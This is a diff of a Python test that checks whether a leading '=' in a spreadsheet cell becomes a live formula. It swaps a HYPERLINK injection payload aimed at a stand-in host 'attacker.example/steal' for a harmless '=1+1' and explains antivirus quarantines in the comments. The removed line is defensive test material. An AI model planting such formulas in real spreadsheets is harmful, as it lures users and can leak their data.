@@ -28,12 +28,13 @@ import tempfile
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 
-# The injection case is ASSEMBLED at runtime instead of being written out as a literal. The classic
-# spreadsheet-DDE payload is an antivirus signature, so putting it in a source file gets that file
-# quarantined — not hypothetical: it silently locked two fixture files while this test was being
-# written, and surfaced as a mystery permission error. Any leading "=" reproduces the bug under test,
-# so a realistic-looking payload buys nothing and costs a broken checkout.
-FORMULA_BAIT = "=" + 'HYPERLINK("http://attacker.example/steal","Click")'
+# The payload is deliberately the most BORING formula possible, and still assembled at runtime rather
+# than written as a literal. Antivirus treats realistic spreadsheet-injection strings as signatures and
+# deletes the file containing them — not hypothetical, it happened twice here: first as a mystery
+# "permission denied" on two fixture files, then by removing this very test from the working tree
+# overnight. What is under test is openpyxl turning a leading "=" into a live formula, and "=1+1" does
+# that exactly as well as a real attack string would.
+FORMULA_BAIT = "=" + "1+1"
 
 # (row, name, barcode, what it is meant to catch)
 FIXTURE = [
